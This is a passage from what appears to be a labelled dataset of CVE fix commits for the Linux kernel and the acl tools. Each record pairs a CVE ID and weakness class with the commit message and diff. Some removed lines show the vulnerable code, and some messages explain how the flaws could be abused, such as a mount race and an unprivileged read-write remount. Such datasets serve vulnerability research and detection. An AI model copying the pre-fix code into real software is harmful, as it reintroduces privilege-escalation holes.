<john.johansen@canonical.com>\nDate: Fri, 22 Jul 2011 08:14:15 -0700\nSubject: Ecryptfs: Add mount option to check uid of device being mounted =\n expect uid\n\nClose a TOCTOU race for mounts done via ecryptfs-mount-private.  The mount\nsource (device) can be raced when the ownership test is done in userspace.\nProvide Ecryptfs a means to force the uid check at mount time.\n\nSigned-off-by: John Johansen <john.johansen@canonical.com>\nCc: <stable@kernel.org>\nSigned-off-by: Tyler Hicks <tyhicks@linux.vnet.ibm.com>\n---\n fs\/ecryptfs\/main.c | 23 +++++++++++++++++++++--\n 1 file changed, 21 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/fs\/ecryptfs\/main.c b\/fs\/ecryptfs\/main.c\nindex 9f1bb747d77d..b4a6befb1216 100644\n--- a\/fs\/ecryptfs\/main.c\n+++ b\/fs\/ecryptfs\/main.c\n@@ -175,6 +175,7 @@ enum { ecryptfs_opt_sig, ecryptfs_opt_ecryptfs_sig,\n        ecryptfs_opt_encrypted_view, ecryptfs_opt_fnek_sig,\n        ecryptfs_opt_fn_cipher, ecryptfs_opt_fn_cipher_key_bytes,\n        ecryptfs_opt_unlink_sigs, ecryptfs_opt_mount_auth_tok_only,\n+       ecryptfs_opt_check_dev_ruid,\n        ecryptfs_opt_err };\n \n static const match_table_t tokens = {\n@@ -191,6 +192,7 @@ static const match_table_t tokens = {\n \t{ecryptfs_opt_fn_cipher_key_bytes, \"ecryptfs_fn_key_bytes=%u\"},\n \t{ecryptfs_opt_unlink_sigs, \"ecryptfs_unlink_sigs\"},\n \t{ecryptfs_opt_mount_auth_tok_only, \"ecryptfs_mount_auth_tok_only\"},\n+\t{ecryptfs_opt_check_dev_ruid, \"ecryptfs_check_dev_ruid\"},\n \t{ecryptfs_opt_err, NULL}\n };\n \n@@ -236,6 +238,7 @@ static void ecryptfs_init_mount_crypt_stat(\n  * ecryptfs_parse_options\n  * @sb: The ecryptfs super block\n  * @options: The options passed to the kernel\n+ * @check_ruid: set to 1 if device uid should be checked against the ruid\n  *\n  * Parse mount options:\n  * debug=N \t   - ecryptfs_verbosity level for debug output\n@@ -251,7 +254,8 @@ static void ecryptfs_init_mount_crypt_stat(\n  *\n  * Returns zero on success; non-zero on error\n  *\/\n-static int ecryptfs_parse_options(struct ecryptfs_sb_info *sbi, char *options)\n+static int ecryptfs_parse_options(struct ecryptfs_sb_info *sbi, char *options,\n+\t\t\t\t  uid_t *check_ruid)\n {\n \tchar *p;\n \tint rc = 0;\n@@ -276,6 +280,8 @@ static int ecryptfs_parse_options(struct ecryptfs_sb_info *sbi, char *options)\n \tchar *cipher_key_bytes_src;\n \tchar *fn_cipher_key_bytes_src;\n \n+\t*check_ruid = 0;\n+\n \tif (!options) {\n \t\trc = -EINVAL;\n \t\tgoto out;\n@@ -380,6 +386,9 @@ static int ecryptfs_parse_options(struct ecryptfs_sb_info *sbi, char *options)\n \t\t\tmount_crypt_stat->flags |=\n \t\t\t\tECRYPTFS_GLOBAL_MOUNT_AUTH_TOK_ONLY;\n \t\t\tbreak;\n+\t\tcase ecryptfs_opt_check_dev_ruid:\n+\t\t\t*check_ruid = 1;\n+\t\t\tbreak;\n \t\tcase ecryptfs_opt_err:\n \t\tdefault:\n \t\t\tprintk(KERN_WARNING\n@@ -475,6 +484,7 @@ static struct dentry *ecryptfs_mount(struct file_system_type *fs_type, int flags\n \tconst char *err = \"Getting sb failed\";\n \tstruct inode *inode;\n \tstruct path path;\n+\tuid_t check_ruid;\n \tint rc;\n \n \tsbi = kmem_cache_zalloc(ecryptfs_sb_info_cache, GFP_KERNEL);\n@@ -483,7 +493,7 @@ static struct dentry *ecryptfs_mount(struct file_system_type *fs_type, int flags\n \t\tgoto out;\n \t}\n \n-\trc = ecryptfs_parse_options(sbi, raw_data);\n+\trc = ecryptfs_parse_options(sbi, raw_data, &check_ruid);\n \tif (rc) {\n \t\terr = \"Error parsing options\";\n \t\tgoto out;\n@@ -521,6 +531,15 @@ static struct dentry *ecryptfs_mount(struct file_system_type *fs_type, int flags\n \t\t\t\"known incompatibilities\\n\");\n \t\tgoto out_free;\n \t}\n+\n+\tif (check_ruid && path.dentry->d_inode->i_uid != current_uid()) {\n+\t\trc = -EPERM;\n+\t\tprintk(KERN_ERR \"Mount of device (uid: %d) not owned by \"\n+\t\t       \"requested user (uid: %d)\\n\",\n+\t\t       path.dentry->d_inode->i_uid, current_uid());\n+\t\tgoto out_free;\n+\t}\n+\n \tecryptfs_set_superblock_lower(s, path.dentry->d_sb);\n \ts->s_maxbytes = path.dentry->d_sb->s_maxbytes;\n \ts->s_blocksize = path.dentry->d_sb->s_blocksize;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"mjg59","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-5206","CWE_ID":"264","category":"security","commit_id":"a6138db815df5ee542d848318e5dae681590fccd","commit_message":"From a6138db815df5ee542d848318e5dae681590fccd Mon Sep 17 00:00:00 2001\nFrom: \"Eric W. Biederman\" <ebiederm@xmission.com>\nDate: Mon, 28 Jul 2014 16:26:53 -0700\nSubject: [PATCH] mnt: Only change user settable mount flags in remount\n\nKenton Varda <kenton@sandstorm.io> discovered that by remounting a\nread-only bind mount read-only in a user namespace the\nMNT_LOCK_READONLY bit would be cleared, allowing an unprivileged user\nto the remount a read-only mount read-write.\n\nCorrect this by replacing the mask of mount flags to preserve\nwith a mask of mount flags that may be changed, and preserve\nall others.   This ensures that any future bugs with this mask and\nremount will fail in an easy to detect way where new mount flags\nsimply won't change.\n\nCc: stable@vger.kernel.org\nAcked-by: Serge E. Hallyn <serge.hallyn@ubuntu.com>\nSigned-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>\n---\n fs\/namespace.c        | 2 +-\n include\/linux\/mount.h | 4 +++-\n 2 files changed, 4 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/fs\/namespace.c b\/fs\/namespace.c\nindex 7187d01329c35..cb40449ea0dfe 100644\n--- a\/fs\/namespace.c\n+++ b\/fs\/namespace.c\n@@ -1937,7 +1937,7 @@ static int do_remount(struct path *path, int flags, int mnt_flags,\n \t\terr = do_remount_sb(sb, flags, data, 0);\n \tif (!err) {\n \t\tlock_mount_hash();\n-\t\tmnt_flags |= mnt->mnt.mnt_flags & MNT_PROPAGATION_MASK;\n+\t\tmnt_flags |= mnt->mnt.mnt_flags & ~MNT_USER_SETTABLE_MASK;\n \t\tmnt->mnt.mnt_flags = mnt_flags;\n \t\ttouch_mnt_namespace(mnt->mnt_ns);\n \t\tunlock_mount_hash();\ndiff --git a\/include\/linux\/mount.h b\/include\/linux\/mount.h\nindex 839bac2709048..b637a89e1faeb 100644\n--- a\/include\/linux\/mount.h\n+++ b\/include\/linux\/mount.h\n@@ -42,7 +42,9 @@ struct mnt_namespace;\n  * flag, consider how it interacts with shared mounts.\n  *\/\n #define MNT_SHARED_MASK\t(MNT_UNBINDABLE)\n-#define MNT_PROPAGATION_MASK\t(MNT_SHARED | MNT_UNBINDABLE)\n+#define MNT_USER_SETTABLE_MASK  (MNT_NOSUID | MNT_NODEV | MNT_NOEXEC \\\n+\t\t\t\t | MNT_NOATIME | MNT_NODIRATIME | MNT_RELATIME \\\n+\t\t\t\t | MNT_READONLY)\n \n #define MNT_INTERNAL_FLAGS (MNT_SHARED | MNT_WRITE_HOLD | MNT_INTERNAL | \\\n \t\t\t    MNT_DOOMED | MNT_SYNC_UMOUNT | MNT_MARKED)\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2012-2123","CWE_ID":"264","category":"security","commit_id":"d52fc5dde171f030170a6cb78034d166b13c9445","commit_message":"From d52fc5dde171f030170a6cb78034d166b13c9445 Mon Sep 17 00:00:00 2001\nFrom: Eric Paris <eparis@redhat.com>\nDate: Tue, 17 Apr 2012 16:26:54 -0400\nSubject: fcaps: clear the same personality flags as suid when fcaps are used\n\nIf a process increases permissions using fcaps all of the dangerous\npersonality flags which are cleared for suid apps should also be cleared.\nThus programs given priviledge with fcaps will continue to have address space\nrandomization enabled even if the parent tried to disable it to make it\neasier to attack.\n\nSigned-off-by: Eric Paris <eparis@redhat.com>\nReviewed-by: Serge Hallyn <serge.hallyn@canonical.com>\nSigned-off-by: James Morris <james.l.morris@oracle.com>\n---\n security\/commoncap.c | 5 +++++\n 1 file changed, 5 insertions(+)\n\n","diff_code":"diff --git a\/security\/commoncap.c b\/security\/commoncap.c\nindex 0cf4b53480a7..0ecf4ba321cb 100644\n--- a\/security\/commoncap.c\n+++ b\/security\/commoncap.c\n@@ -505,6 +505,11 @@ int cap_bprm_set_creds(struct linux_binprm *bprm)\n \t}\n skip:\n \n+\t\/* if we have fs caps, clear dangerous personality flags *\/\n+\tif (!cap_issubset(new->cap_permitted, old->cap_permitted))\n+\t\tbprm->per_clear |= PER_CLEAR_ON_SETID;\n+\n+\n \t\/* Don't let someone trace a set[ug]id\/setpcap binary with the revised\n \t * credentials unless they have the appropriate permit\n \t *\/\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-4014","CWE_ID":"264","category":"security","commit_id":"23adbe12ef7d3d4195e80800ab36b37bee28cd03","commit_message":"From 23adbe12ef7d3d4195e80800ab36b37bee28cd03 Mon Sep 17 00:00:00 2001\nFrom: Andy Lutomirski <luto@amacapital.net>\nDate: Tue, 10 Jun 2014 12:45:42 -0700\nSubject: [PATCH] fs,userns: Change inode_capable to capable_wrt_inode_uidgid\n\nThe kernel has no concept of capabilities with respect to inodes; inodes\nexist independently of namespaces.  For example, inode_capable(inode,\nCAP_LINUX_IMMUTABLE) would be nonsense.\n\nThis patch changes inode_capable to check for uid and gid mappings and\nrenames it to capable_wrt_inode_uidgid, which should make it more\nobvious what it does.\n\nFixes CVE-2014-4014.\n\nCc: Theodore Ts'o <tytso@mit.edu>\nCc: Serge Hallyn <serge.hallyn@ubuntu.com>\nCc: \"Eric W. Biederman\" <ebiederm@xmission.com>\nCc: Dave Chinner <david@fromorbit.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Andy Lutomirski <luto@amacapital.net>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n fs\/attr.c                  |  8 ++++----\n fs\/inode.c                 | 10 +++++++---\n fs\/namei.c                 | 11 ++++++-----\n fs\/xfs\/xfs_ioctl.c         |  2 +-\n include\/linux\/capability.h |  2 +-\n kernel\/capability.c        | 20 ++++++++------------\n 6 files changed, 27 insertions(+), 26 deletions(-)\n\n","diff_code":"diff --git a\/fs\/attr.c b\/fs\/attr.c\nindex 5d4e59d56e854..6530ced19697d 100644\n--- a\/fs\/attr.c\n+++ b\/fs\/attr.c\n@@ -50,14 +50,14 @@ int inode_change_ok(const struct inode *inode, struct iattr *attr)\n \tif ((ia_valid & ATTR_UID) &&\n \t    (!uid_eq(current_fsuid(), inode->i_uid) ||\n \t     !uid_eq(attr->ia_uid, inode->i_uid)) &&\n-\t    !inode_capable(inode, CAP_CHOWN))\n+\t    !capable_wrt_inode_uidgid(inode, CAP_CHOWN))\n \t\treturn -EPERM;\n \n \t\/* Make sure caller can chgrp. *\/\n \tif ((ia_valid & ATTR_GID) &&\n \t    (!uid_eq(current_fsuid(), inode->i_uid) ||\n \t    (!in_group_p(attr->ia_gid) && !gid_eq(attr->ia_gid, inode->i_gid))) &&\n-\t    !inode_capable(inode, CAP_CHOWN))\n+\t    !capable_wrt_inode_uidgid(inode, CAP_CHOWN))\n \t\treturn -EPERM;\n \n \t\/* Make sure a caller can chmod. *\/\n@@ -67,7 +67,7 @@ int inode_change_ok(const struct inode *inode, struct iattr *attr)\n \t\t\/* Also check the setgid bit! *\/\n \t\tif (!in_group_p((ia_valid & ATTR_GID) ? attr->ia_gid :\n \t\t\t\tinode->i_gid) &&\n-\t\t    !inode_capable(inode, CAP_FSETID))\n+\t\t    !capable_wrt_inode_uidgid(inode, CAP_FSETID))\n \t\t\tattr->ia_mode &= ~S_ISGID;\n \t}\n \n@@ -160,7 +160,7 @@ void setattr_copy(struct inode *inode, const struct iattr *attr)\n \t\tumode_t mode = attr->ia_mode;\n \n \t\tif (!in_group_p(inode->i_gid) &&\n-\t\t    !inode_capable(inode, CAP_FSETID))\n+\t\t    !capable_wrt_inode_uidgid(inode, CAP_FSETID))\n \t\t\tmode &= ~S_ISGID;\n \t\tinode->i_mode = mode;\n \t}\ndiff --git a\/fs\/inode.c b\/fs\/inode.c\nindex 2feb9b69f1be9..6eecb7ff0b9aa 100644\n--- a\/fs\/inode.c\n+++ b\/fs\/inode.c\n@@ -1839,14 +1839,18 @@ EXPORT_SYMBOL(inode_init_owner);\n  * inode_owner_or_capable - check current task permissions to inode\n  * @inode: inode being checked\n  *\n- * Return true if current either has CAP_FOWNER to the inode, or\n- * owns the file.\n+ * Return true if current either has CAP_FOWNER in a namespace with the\n+ * inode owner uid mapped, or owns the file.\n  *\/\n bool inode_owner_or_capable(const struct inode *inode)\n {\n+\tstruct user_namespace *ns;\n+\n \tif (uid_eq(current_fsuid(), inode->i_uid))\n \t\treturn true;\n-\tif (inode_capable(inode, CAP_FOWNER))\n+\n+\tns = current_user_ns();\n+\tif (ns_capable(ns, CAP_FOWNER) && kuid_has_mapping(ns, inode->i_uid))\n \t\treturn true;\n \treturn false;\n }\ndiff --git a\/fs\/namei.c b\/fs\/namei.c\nindex 80168273396bb..985c6f3684859 100644\n--- a\/fs\/namei.c\n+++ b\/fs\/namei.c\n@@ -332,10 +332,11 @@ int generic_permission(struct inode *inode, int mask)\n \n \tif (S_ISDIR(inode->i_mode)) {\n \t\t\/* DACs are overridable for directories *\/\n-\t\tif (inode_capable(inode, CAP_DAC_OVERRIDE))\n+\t\tif (capable_wrt_inode_uidgid(inode, CAP_DAC_OVERRIDE))\n \t\t\treturn 0;\n \t\tif (!(mask & MAY_WRITE))\n-\t\t\tif (inode_capable(inode, CAP_DAC_READ_SEARCH))\n+\t\t\tif (capable_wrt_inode_uidgid(inode,\n+\t\t\t\t\t\t     CAP_DAC_READ_SEARCH))\n \t\t\t\treturn 0;\n \t\treturn -EACCES;\n \t}\n@@ -345,7 +346,7 @@ int generic_permission(struct inode *inode, int mask)\n \t * at least one exec bit set.\n \t *\/\n \tif (!(mask & MAY_EXEC) || (inode->i_mode & S_IXUGO))\n-\t\tif (inode_capable(inode, CAP_DAC_OVERRIDE))\n+\t\tif (capable_wrt_inode_uidgid(inode, CAP_DAC_OVERRIDE))\n \t\t\treturn 0;\n \n \t\/*\n@@ -353,7 +354,7 @@ int generic_permission(struct inode *inode, int mask)\n \t *\/\n \tmask &= MAY_READ | MAY_WRITE | MAY_EXEC;\n \tif (mask == MAY_READ)\n-\t\tif (inode_capable(inode, CAP_DAC_READ_SEARCH))\n+\t\tif (capable_wrt_inode_uidgid(inode, CAP_DAC_READ_SEARCH))\n \t\t\treturn 0;\n \n \treturn -EACCES;\n@@ -2379,7 +2380,7 @@ static inline int check_sticky(struct inode *dir, struct inode *inode)\n \t\treturn 0;\n \tif (uid_eq(dir->i_uid, fsuid))\n \t\treturn 0;\n-\treturn !inode_capable(inode, CAP_FOWNER);\n+\treturn !capable_wrt_inode_uidgid(inode, CAP_FOWNER);\n }\n \n \/*\ndiff --git a\/fs\/xfs\/xfs_ioctl.c b\/fs\/xfs\/xfs_ioctl.c\nindex 0b18776b075e4..6152cbe353e8e 100644\n--- a\/fs\/xfs\/xfs_ioctl.c\n+++ b\/fs\/xfs\/xfs_ioctl.c\n@@ -1215,7 +1215,7 @@ xfs_ioctl_setattr(\n \t\t * cleared upon successful return from chown()\n \t\t *\/\n \t\tif ((ip->i_d.di_mode & (S_ISUID|S_ISGID)) &&\n-\t\t    !inode_capable(VFS_I(ip), CAP_FSETID))\n+\t\t    !capable_wrt_inode_uidgid(VFS_I(ip), CAP_FSETID))\n \t\t\tip->i_d.di_mode &= ~(S_ISUID|S_ISGID);\n \n \t\t\/*\ndiff --git a\/include\/linux\/capability.h b\/include\/linux\/capability.h\nindex a6ee1f9a50185..84b13ad67c1cc 100644\n--- a\/include\/linux\/capability.h\n+++ b\/include\/linux\/capability.h\n@@ -210,7 +210,7 @@ extern bool has_ns_capability_noaudit(struct task_struct *t,\n \t\t\t\t      struct user_namespace *ns, int cap);\n extern bool capable(int cap);\n extern bool ns_capable(struct user_namespace *ns, int cap);\n-extern bool inode_capable(const struct inode *inode, int cap);\n+extern bool capable_wrt_inode_uidgid(const struct inode *inode, int cap);\n extern bool file_ns_capable(const struct file *file, struct user_namespace *ns, int cap);\n \n \/* audit system wants to get cap info from files as well *\/\ndiff --git a\/kernel\/capability.c b\/kernel\/capability.c\nindex 84b2bbf443e71..a5cf13c018cec 100644\n--- a\/kernel\/capability.c\n+++ b\/kernel\/capability.c\n@@ -424,23 +424,19 @@ bool capable(int cap)\n EXPORT_SYMBOL(capable);\n \n \/**\n- * inode_capable - Check superior capability over inode\n+ * capable_wrt_inode_uidgid - Check nsown_capable and uid and gid mapped\n  * @inode: The inode in question\n  * @cap: The capability in question\n  *\n- * Return true if the current task has the given superior capability\n- * targeted at it's own user namespace and that the given inode is owned\n- * by the current user namespace or a child namespace.\n- *\n- * Currently we check to see if an inode is owned by the current\n- * user namespace by seeing if the inode's owner maps into the\n- * current user namespace.\n- *\n+ * Return true if the current task has the given capability targeted at\n+ * its own user namespace and that the given inode's uid and gid are\n+ * mapped into the current user namespace.\n  *\/\n-bool inode_capable(const struct inode *inode, int cap)\n+bool capable_wrt_inode_uidgid(const struct inode *inode, int cap)\n {\n \tstruct user_namespace *ns = current_user_ns();\n \n-\treturn ns_capable(ns, cap) && kuid_has_mapping(ns, inode->i_uid);\n+\treturn ns_capable(ns, cap) && kuid_has_mapping(ns, inode->i_uid) &&\n+\t\tkgid_has_mapping(ns, inode->i_gid);\n }\n-EXPORT_SYMBOL(inode_capable);\n+EXPORT_SYMBOL(capable_wrt_inode_uidgid);\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2009-4411","CWE_ID":"264","category":"security","commit_id":"63451a06b7484d220750ed8574d3ee84e156daf5","commit_message":"From 63451a06b7484d220750ed8574d3ee84e156daf5 Mon Sep 17 00:00:00 2001\nFrom: Andreas Gruenbacher <agruen@suse.de>\nDate: Tue, 23 Jun 2009 00:29:45 +0200\nSubject: Make sure that getfacl -R only calls stat(2) on symlinks when it\n needs to\n\nThis fixes http:\/\/oss.sgi.com\/bugzilla\/show_bug.cgi?id=790\n\"getfacl follows symlinks, even without -L\".\n---\n doc\/CHANGES       | 3 +++\n getfacl\/getfacl.c | 7 ++++---\n 2 files changed, 7 insertions(+), 3 deletions(-)\n\n","diff_code":"diff --git a\/doc\/CHANGES b\/doc\/CHANGES\nindex 327a19b..c5ff1a8 100644\n--- a\/doc\/CHANGES\n+++ b\/doc\/CHANGES\n@@ -1,3 +1,6 @@\n+* Make sure that getfacl -R only calls stat(2) on symlinks when it needs to.\n+  This fixes http:\/\/oss.sgi.com\/bugzilla\/show_bug.cgi?id=790 \"getfacl follows\n+  symlinks, even without -L\".\n * Stop quoting nonprintable characters in the getfacl output: what is printable\n   or not depends on the locale settings, and getfacl often gets it wrong. We\n   still need to quote a few special characters like newlines so that setfacl\ndiff --git a\/getfacl\/getfacl.c b\/getfacl\/getfacl.c\nindex fc650e3..b3e6200 100644\n--- a\/getfacl\/getfacl.c\n+++ b\/getfacl\/getfacl.c\n@@ -70,7 +70,7 @@ struct option long_options[] = {\n const char *progname;\n const char *cmd_line_options;\n \n-int walk_flags = WALK_TREE_DEREFERENCE;\n+int walk_flags = WALK_TREE_DEREFERENCE_TOPLEVEL;\n int opt_print_acl;\n int opt_print_default_acl;\n int opt_strip_leading_slash = 1;\n@@ -642,7 +642,7 @@ int main(int argc, char *argv[])\n \t\t\tcase 'L':  \/* follow all symlinks *\/\n \t\t\t\tif (posixly_correct)\n \t\t\t\t\tgoto synopsis;\n-\t\t\t\twalk_flags |= WALK_TREE_LOGICAL;\n+\t\t\t\twalk_flags |= WALK_TREE_LOGICAL | WALK_TREE_DEREFERENCE;\n \t\t\t\twalk_flags &= ~WALK_TREE_PHYSICAL;\n \t\t\t\tbreak;\n \n@@ -650,7 +650,8 @@ int main(int argc, char *argv[])\n \t\t\t\tif (posixly_correct)\n \t\t\t\t\tgoto synopsis;\n \t\t\t\twalk_flags |= WALK_TREE_PHYSICAL;\n-\t\t\t\twalk_flags &= ~WALK_TREE_LOGICAL;\n+\t\t\t\twalk_flags &= ~(WALK_TREE_LOGICAL | WALK_TREE_DEREFERENCE |\n+\t\t\t\t\t\tWALK_TREE_DEREFERENCE_TOPLEVEL);\n \t\t\t\tbreak;\n \n \t\t\tcase 's':  \/* skip files with only base entries *\/\n-- \ncgit v1.0-41-gc330\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-9870","CWE_ID":"264","category":"security","commit_id":"a4780adeefd042482f624f5e0d577bf9cdcbb760","commit_message":"From a4780adeefd042482f624f5e0d577bf9cdcbb760 Mon Sep 17 00:00:00 2001\nFrom: =?UTF-8?q?Andr=C3=A9=20Hentschel?= <nerv@dawncrow.de>\nDate: Tue, 18 Jun 2013 23:23:26 +0100\nSubject: [PATCH] ARM: 7735\/2: Preserve the user r\/w register TPIDRURW on\n context switch and fork\nMIME-Version: 1.0\nContent-Type: text\/plain; charset=UTF-8\nContent-Transfer-Encoding: 8bit\n\nSince commit 6a1c53124aa1 the user writeable TLS register was zeroed to\nprevent it from being used as a covert channel between two tasks.\n\nThere are more and more applications coming to Windows RT,\nWine could support them, but mostly they expect to have\nthe thread environment block (TEB) in TPIDRURW.\n\nThis patch preserves that register per thread instead of clearing it.\nUnlike the TPIDRURO, which is already switched, the TPIDRURW\ncan be updated from userspace so needs careful treatment in the case that we\nmodify TPIDRURW and call fork(). To avoid this we must always read\nTPIDRURW in copy_thread.\n\nSigned-off-by: Andr\u00e9 Hentschel <nerv@dawncrow.de>\nSigned-off-by: Will Deacon <will.deacon@arm.com>\nSigned-off-by: Jonathan Austin <jonathan.austin@arm.com>\nSigned-off-by: Russell King <rmk+kernel@arm.linux.org.uk>\n---\n arch\/arm\/include\/asm\/thread_info.h |  2 +-\n arch\/arm\/include\/asm\/tls.h         | 40 ++++++++++++++++++++----------\n arch\/arm\/kernel\/entry-armv.S       |  5 ++--\n arch\/arm\/kernel\/process.c          |  4 ++-\n arch\/arm\/kernel\/ptrace.c           |  2 +-\n arch\/arm\/kernel\/traps.c            |  4 +--\n 6 files changed, 37 insertions(+), 20 deletions(-)\n\n","diff_code":"diff --git a\/arch\/arm\/include\/asm\/thread_info.h b\/arch\/arm\/include\/asm\/thread_info.h\nindex 1995d1a840609..214d4158089af 100644\n--- a\/arch\/arm\/include\/asm\/thread_info.h\n+++ b\/arch\/arm\/include\/asm\/thread_info.h\n@@ -58,7 +58,7 @@ struct thread_info {\n \tstruct cpu_context_save\tcpu_context;\t\/* cpu context *\/\n \t__u32\t\t\tsyscall;\t\/* syscall number *\/\n \t__u8\t\t\tused_cp[16];\t\/* thread used copro *\/\n-\tunsigned long\t\ttp_value;\n+\tunsigned long\t\ttp_value[2];\t\/* TLS registers *\/\n #ifdef CONFIG_CRUNCH\n \tstruct crunch_state\tcrunchstate;\n #endif\ndiff --git a\/arch\/arm\/include\/asm\/tls.h b\/arch\/arm\/include\/asm\/tls.h\nindex 73409e6c02510..83259b8733337 100644\n--- a\/arch\/arm\/include\/asm\/tls.h\n+++ b\/arch\/arm\/include\/asm\/tls.h\n@@ -2,27 +2,30 @@\n #define __ASMARM_TLS_H\n \n #ifdef __ASSEMBLY__\n-\t.macro set_tls_none, tp, tmp1, tmp2\n+#include <asm\/asm-offsets.h>\n+\t.macro switch_tls_none, base, tp, tpuser, tmp1, tmp2\n \t.endm\n \n-\t.macro set_tls_v6k, tp, tmp1, tmp2\n+\t.macro switch_tls_v6k, base, tp, tpuser, tmp1, tmp2\n+\tmrc\tp15, 0, \\tmp2, c13, c0, 2\t@ get the user r\/w register\n \tmcr\tp15, 0, \\tp, c13, c0, 3\t\t@ set TLS register\n-\tmov\t\\tmp1, #0\n-\tmcr\tp15, 0, \\tmp1, c13, c0, 2\t@ clear user r\/w TLS register\n+\tmcr\tp15, 0, \\tpuser, c13, c0, 2\t@ and the user r\/w register\n+\tstr\t\\tmp2, [\\base, #TI_TP_VALUE + 4] @ save it\n \t.endm\n \n-\t.macro set_tls_v6, tp, tmp1, tmp2\n+\t.macro switch_tls_v6, base, tp, tpuser, tmp1, tmp2\n \tldr\t\\tmp1, =elf_hwcap\n \tldr\t\\tmp1, [\\tmp1, #0]\n \tmov\t\\tmp2, #0xffff0fff\n \ttst\t\\tmp1, #HWCAP_TLS\t\t@ hardware TLS available?\n-\tmcrne\tp15, 0, \\tp, c13, c0, 3\t\t@ yes, set TLS register\n-\tmovne\t\\tmp1, #0\n-\tmcrne\tp15, 0, \\tmp1, c13, c0, 2\t@ clear user r\/w TLS register\n \tstreq\t\\tp, [\\tmp2, #-15]\t\t@ set TLS value at 0xffff0ff0\n+\tmrcne\tp15, 0, \\tmp2, c13, c0, 2\t@ get the user r\/w register\n+\tmcrne\tp15, 0, \\tp, c13, c0, 3\t\t@ yes, set TLS register\n+\tmcrne\tp15, 0, \\tpuser, c13, c0, 2\t@ set user r\/w register\n+\tstrne\t\\tmp2, [\\base, #TI_TP_VALUE + 4] @ save it\n \t.endm\n \n-\t.macro set_tls_software, tp, tmp1, tmp2\n+\t.macro switch_tls_software, base, tp, tpuser, tmp1, tmp2\n \tmov\t\\tmp1, #0xffff0fff\n \tstr\t\\tp, [\\tmp1, #-15]\t\t@ set TLS value at 0xffff0ff0\n \t.endm\n@@ -31,19 +34,30 @@\n #ifdef CONFIG_TLS_REG_EMUL\n #define tls_emu\t\t1\n #define has_tls_reg\t\t1\n-#define set_tls\t\tset_tls_none\n+#define switch_tls\tswitch_tls_none\n #elif defined(CONFIG_CPU_V6)\n #define tls_emu\t\t0\n #define has_tls_reg\t\t(elf_hwcap & HWCAP_TLS)\n-#define set_tls\t\tset_tls_v6\n+#define switch_tls\tswitch_tls_v6\n #elif defined(CONFIG_CPU_32v6K)\n #define tls_emu\t\t0\n #define has_tls_reg\t\t1\n-#define set_tls\t\tset_tls_v6k\n+#define switch_tls\tswitch_tls_v6k\n #else\n #define tls_emu\t\t0\n #define has_tls_reg\t\t0\n-#define set_tls\t\tset_tls_software\n+#define switch_tls\tswitch_tls_software\n #endif\n \n+#ifndef __ASSEMBLY__\n+static inline unsigned long get_tpuser(void)\n+{\n+\tunsigned long reg = 0;\n+\n+\tif (has_tls_reg && !tls_emu)\n+\t\t__asm__(\"mrc p15, 0, %0, c13, c0, 2\" : \"=r\" (reg));\n+\n+\treturn reg;\n+}\n+#endif\n #endif\t\/* __ASMARM_TLS_H *\/\ndiff --git a\/arch\/arm\/kernel\/entry-armv.S b\/arch\/arm\/kernel\/entry-armv.S\nindex 582b405befc52..a39cfc2a1f905 100644\n--- a\/arch\/arm\/kernel\/entry-armv.S\n+++ b\/arch\/arm\/kernel\/entry-armv.S\n@@ -685,15 +685,16 @@ ENTRY(__switch_to)\n  UNWIND(.fnstart\t)\n  UNWIND(.cantunwind\t)\n \tadd\tip, r1, #TI_CPU_SAVE\n-\tldr\tr3, [r2, #TI_TP_VALUE]\n  ARM(\tstmia\tip!, {r4 - sl, fp, sp, lr} )\t@ Store most regs on stack\n  THUMB(\tstmia\tip!, {r4 - sl, fp}\t   )\t@ Store most regs on stack\n  THUMB(\tstr\tsp, [ip], #4\t\t   )\n  THUMB(\tstr\tlr, [ip], #4\t\t   )\n+\tldr\tr4, [r2, #TI_TP_VALUE]\n+\tldr\tr5, [r2, #TI_TP_VALUE + 4]\n #ifdef CONFIG_CPU_USE_DOMAINS\n \tldr\tr6, [r2, #TI_CPU_DOMAIN]\n #endif\n-\tset_tls\tr3, r4, r5\n+\tswitch_tls r1, r4, r5, r3, r7\n #if defined(CONFIG_CC_STACKPROTECTOR) && !defined(CONFIG_SMP)\n \tldr\tr7, [r2, #TI_TASK]\n \tldr\tr8, =__stack_chk_guard\ndiff --git a\/arch\/arm\/kernel\/process.c b\/arch\/arm\/kernel\/process.c\nindex f219703168366..087064148ebf5 100644\n--- a\/arch\/arm\/kernel\/process.c\n+++ b\/arch\/arm\/kernel\/process.c\n@@ -39,6 +39,7 @@\n #include <asm\/thread_notify.h>\n #include <asm\/stacktrace.h>\n #include <asm\/mach\/time.h>\n+#include <asm\/tls.h>\n \n #ifdef CONFIG_CC_STACKPROTECTOR\n #include <linux\/stackprotector.h>\n@@ -343,7 +344,8 @@ copy_thread(unsigned long clone_flags, unsigned long stack_start,\n \tclear_ptrace_hw_breakpoint(p);\n \n \tif (clone_flags & CLONE_SETTLS)\n-\t\tthread->tp_value = childregs->ARM_r3;\n+\t\tthread->tp_value[0] = childregs->ARM_r3;\n+\tthread->tp_value[1] = get_tpuser();\n \n \tthread_notify(THREAD_NOTIFY_COPY, thread);\n \ndiff --git a\/arch\/arm\/kernel\/ptrace.c b\/arch\/arm\/kernel\/ptrace.c\nindex 03deeffd9f6d0..2bc1514d6dbe8 100644\n--- a\/arch\/arm\/kernel\/ptrace.c\n+++ b\/arch\/arm\/kernel\/ptrace.c\n@@ -849,7 +849,7 @@ long arch_ptrace(struct task_struct *child, long request,\n #endif\n \n \t\tcase PTRACE_GET_THREAD_AREA:\n-\t\t\tret = put_user(task_thread_info(child)->tp_value,\n+\t\t\tret = put_user(task_thread_info(child)->tp_value[0],\n \t\t\t\t       datap);\n \t\t\tbreak;\n \ndiff --git a\/arch\/arm\/kernel\/traps.c b\/arch\/arm\/kernel\/traps.c\nindex 